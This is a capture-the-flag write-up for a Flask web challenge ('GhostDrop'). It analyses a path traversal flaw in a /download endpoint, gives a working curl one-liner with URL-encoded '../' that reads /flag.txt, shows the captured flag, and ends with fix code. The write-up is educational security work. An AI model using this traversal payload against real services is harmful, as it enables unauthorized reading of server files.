# MicrosoftAxel (GhostDrop) - Web Challenge

## TL;DR

Path traversal in `/download/<path:filename>` — Flask's `<path:>` converter accepts slashes and `send_file(FILES_DIR / filename)` does not validate that the path is within the allowed directory. `..%2F..%2Fflag.txt` reads `/flag.txt` directly.

## Description

Flask application ("GhostDrop") that allows downloading files from the Internet using `axel` (download accelerator) and then serving them from `/app/files/`. It has a `/download/<path:filename>` endpoint for downloading the stored files.

## Analysis

### Architecture

```
                    ┌──────────────────────────┐
  POST /fetch ────▶ │   Flask app (appuser)     │
   url=https://...  │                           │
                    │  axel $url → /app/files/  │
                    │                           │
  GET /download/X ─▶│  send_file(FILES_DIR / X) │──▶ file
                    └──────────────────────────┘

  entrypoint.sh: root loop executes /tmp/.cmd if it exists
  /readFlag: binary that reads /flag.txt (root-owned)
```

### Interesting Components

1. **`/download/<path:filename>`** — serves files with `send_file()`
2. **axel** — download accelerator executed via `subprocess.run([AXEL_BIN, url], cwd=FILES_DIR)`
3. **`/tmp/.cmd`** — entrypoint has a root loop that executes this file every 0.5s
4. **`/readFlag`** — C binary that reads `/flag.txt`

### Vulnerability (CWE-22: Path Traversal)

```python
# app.py:100-103
@app.get("/download/<path:filename>")
def download(filename: str):
    target = FILES_DIR / filename
    return send_file(target, as_attachment=True)
```

Flask's `<path:>` converter accepts slashes (`/`), including `..`. The code constructs `FILES_DIR / filename` without validating that the result is inside `FILES_DIR`.

By URL-encoding the `/` (`%2F`), the web server is prevented from normalizing the path before it reaches the handler:

```
/download/..%2F..%2Fflag.txt
→ filename = "../../flag.txt"
→ target = /app/files/../../flag.txt = /flag.txt
```

### Other Vectors (not necessary)

- **RCE via `/tmp/.cmd`**: if we could write to `/tmp/.cmd` (e.g., by making axel download there), we would get execution as root. But axel writes to `cwd=FILES_DIR` and does not accept the `file://` protocol.
- **readFlag binary**: reads `/flag.txt`, but is not SUID — only useful if RCE is obtained as root via `/tmp/.cmd`.

## Exploit

### One-liner

```bash
curl -s 'http://46.225.117.62:30015/download/..%2F..%2Fflag.txt'
```

### Breakdown

1. `..%2F` is decoded to `../` in Flask
2. `<path:filename>` captures `../../flag.txt` as the parameter
3. `Path("/app/files") / "../../flag.txt"` resolves to `/flag.txt`
4. `send_file("/flag.txt")` returns the content

### Execution

```bash
$ curl -s 'http://46.225.117.62:30015/download/..%2F..%2Fflag.txt'
upCTF{4x3l_0d4y_w1th4_tw1st-QnujG12741463f73}
```

## Flag

```
upCTF{4x3l_0d4y_w1th4_tw1st-QnujG12741463f73}
```

## Key Lessons

- **`send_file()` without path validation = traversal**: always use `safe_join()` or verify that the resolved path is inside the base directory with `.resolve()` and `.is_relative_to()`
- **`<path:>` in Flask accepts `..`**: unlike `<string:>`, the path converter allows slashes and path components like `..`
- **Correct fix**:
  ```python
  target = (FILES_DIR / filename).resolve()
  if not target.is_relative_to(FILES_DIR):
      abort(403)
  return send_file(target, as_attachment=True)
  ```
- **Distractors**: the challenge includes axel, a `/tmp/.cmd` RCE loop, and a readFlag binary that suggest a more complex path, but the flag is directly readable via traversal

## References

- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [Flask send_file security](https://flask.palletsprojects.com/en/3.0.x/api/#flask.send_file)
- [Path Traversal - OWASP](https://owasp.org/www-community/attacks/Path_Traversal)
